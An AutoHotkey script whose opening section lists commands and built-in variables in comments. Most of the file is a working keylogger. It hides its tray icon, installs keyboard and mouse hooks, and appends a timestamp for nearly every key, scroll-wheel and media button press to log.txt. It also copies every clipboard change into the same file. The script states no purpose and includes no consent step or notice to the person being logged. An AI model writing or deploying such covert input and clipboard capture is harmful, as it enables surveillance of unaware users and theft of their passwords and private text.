#persistent
#NoTrayIcon
#InstallKeybdHook
#InstallMouseHook
#ErrorStdOut


; http://www.autohotkey.com/docs/commands/SysGet.htm
; http://www.autohotkey.com/docs/commands/WinGet.htm

; http://www.autohotkey.com/docs/LastFoundWindow.htm
; http://www.autohotkey.com/docs/commands/DllCall.htm

; http://www.autohotkey.com/docs/commands/_CommentFlag.htm
; http://www.autohotkey.com/docs/commands/_Include.htm
; http://www.autohotkey.com/docs/commands/FileInstall.htm

; #UseHook [On|Off]

; http://www.autohotkey.com/docs/commands/ImageSearch.htm

; http://www.autohotkey.com/docs/commands/Menu.htm

; http://www.autohotkey.com/docs/commands/PixelGetColor.htm

; http://www.autohotkey.com/docs/commands/PixelSearch.htm

; ControlGet	Retrieves various types of information about a control.
; ControlGetFocus	Retrieves which control of the target window has input focus, if any.
; ControlGetPos	Retrieves the position and size of a control.
; ControlGetText	Retrieves text from a control.

; DriveGet	Retrieves various types of information about the computer's drive(s).
; DriveSpaceFree	Retrieves the free disk space of a drive, in Megabytes.

; EnvGet	Retrieves an environment variable.

; FileGetAttrib	Reports whether a file or folder is read-only, hidden, etc.
; FileGetShortcut	Retrieves information about a shortcut (.lnk) file, such as its target file.
; FileGetSize	Retrieves the size of a file.
; FileGetTime	Retrieves the datetime stamp of a file or folder.
; FileGetVersion	Retrieves the version of a file.

; FileRead	Reads a file's contents into a variable.
; FileReadLine	Reads the specified line from a file and stores the text in a variable.


; GetKeyState	Checks if a keyboard key or mouse/joystick button is down or up. Also retrieves joystick status.

; GuiControlGet	Retrieves various types of information about a control in a GUI window.

; RegRead	Reads a value from the registry.


; SoundGet	Retrieves various settings from a sound device (master mute, master volume, etc.)
; SoundGetWaveVolume	Retrieves the wave output volume from a sound device.

; StatusBarGetText	Retrieves the text from a standard status bar control.



; WinGetActiveStats	Combines the functions of WinGetActiveTitle and WinGetPos into one command.
; WinGetActiveTitle	Retrieves the title of the active window.
; WinGetClass	Retrieves the specified window's class name.
; WinGet	Retrieves the specified window's unique ID, process ID, process name, or a list of its controls. It can also retrieve a list of all windows matching the specified criteria.
; WinGetPos	Retrieves the position and size of the specified window.
; WinGetText	Retrieves the text from the specified window.
; WinGetTitle	Retrieves the title of the specified window.

; ClipboardAll
; A_TimeIdle
; A_TimeIdlePhysical
; A_TimeSincePriorHotkey
; A_TimeSinceThisHotkey
; A_EventInfo
; A_ThisMenu
; A_ThisMenuItem
; A_ThisMenuItemPos
; A_PriorHotkey

; ComSpec
; A_Temp
; A_OSType
; A_OSVersion
; A_Language
; A_ComputerName
; A_UserName
; A_WinDir
; A_ProgramFiles
; A_AppData
; A_AppDataCommon
; A_Desktop
; A_DesktopCommon
; A_StartMenu
; A_StartMenuCommon
; A_Programs
; A_ProgramsCommon
; A_Startup
; A_StartupCommon
; A_MyDocuments
; A_IsAdmin

; A_ScreenWidth
; A_ScreenHeight



; SysGet, VirtualWidth, 78
; SysGet, VirtualHeight, 79


; A_IPAddress1
; A_IPAddress2
; A_IPAddress3
; A_IPAddress4

; A_Cursor
; A_CaretX
; A_CaretY
; A_Desktop
; A_LastError
; A_

*~'::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~,::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~-::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~.::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~/::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~0::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~1::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~2::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~3::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~4::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~5::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
ToolTip, %Key% 
Sleep 700
ToolTip
return
*~6::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~7::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~8::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~9::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~;::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~=::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~[::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~\::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~]::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~`::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~a::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~b::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~c::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~d::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~e::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~f::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~g::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~h::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~i::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~j::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~k::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~l::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~m::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~n::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~o::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~p::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~q::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~r::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~s::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~t::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~u::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~v::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~w::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~x::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~y::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~z::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return

OnClipboardChange:
FileAppend, %A_Now%%A_Tab%Clipboard`n`n%Clipboard%`n`n, log.txt
return

; *~LButton::
; Key := SubStr(A_ThisHotkey, 3)
; MouseGetPos, x, y
; FileAppend, %A_Now%%A_Tab%%Key%%A_Tab%%x%%A_Tab%%y%`n, log.txt
; return
; *~RButton::
; Key := SubStr(A_ThisHotkey, 3)
; FileAppend, %A_Now%%A_Tab%%Key%%A_Tab%%x%%A_Tab%%y%`n, log.txt
; return
; *~MButton::
; Key := SubStr(A_ThisHotkey, 3)
; FileAppend, %A_Now%%A_Tab%%Key%%A_Tab%%x%%A_Tab%%y%`n, log.txt
; return
*~WheelDown::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~WheelUp::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~WheelLeft::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~WheelRight::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~XButton1::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%%A_Tab%%x%%A_Tab%%y%`n, log.txt
return
*~XButton2::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%%A_Tab%%x%%A_Tab%%y%`n, log.txt
return
*~Space::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Tab::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Enter::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Escape::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Backspace::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Delete::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Insert::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Home::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~End::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~PgUp::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~PgDn::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Up::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Down::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Left::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Right::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~ScrollLock::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~CapsLock::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumLock::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad0::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad1::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad2::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad3::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad4::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad5::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad6::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad7::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad8::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Numpad9::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadAdd::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadClear::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadDel::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadDiv::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadDot::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadDown::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadEnd::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadEnter::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadHome::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadIns::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadLeft::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadMult::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadPgDn::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadPgUp::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadRight::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadSub::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~NumpadUp::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F1::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F2::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F3::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F4::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F5::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F6::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F7::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F8::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F9::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F10::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F11::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F12::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F13::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F14::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F15::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F16::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F17::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F18::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F19::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F20::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F21::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F22::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F23::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~F24::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~AppsKey::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~LWin::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~RWin::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Ctrl::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Alt::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Shift::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~LCtrl::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~RCtrl::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~LShift::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~RShift::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~LAlt::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~RAlt::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~PrintScreen::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~CtrlBreak::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Break::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Back::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Forward::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Refresh::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Stop::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Search::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Favorites::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Browser_Home::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Volume_Mute::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Volume_Down::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Volume_Up::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Media_Next::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Media_Prev::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Media_Stop::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Media_Play_Pause::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Launch_Mail::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Launch_Media::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Launch_App1::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return
*~Launch_App2::
Key := SubStr(A_ThisHotkey, 3)
FileAppend, %A_Now%%A_Tab%%Key%`n, log.txt
return








^+r::Reload

; auto reload on save
; ~^s::
; IfWinActive, %A_ScriptName%
; {
; SplashTextOn,,,Reloading %A_ScriptName%,
; Sleep,500
; SplashTextOff
; Reload
; }
; Else
; {
; Send {^s} 
; }
; return




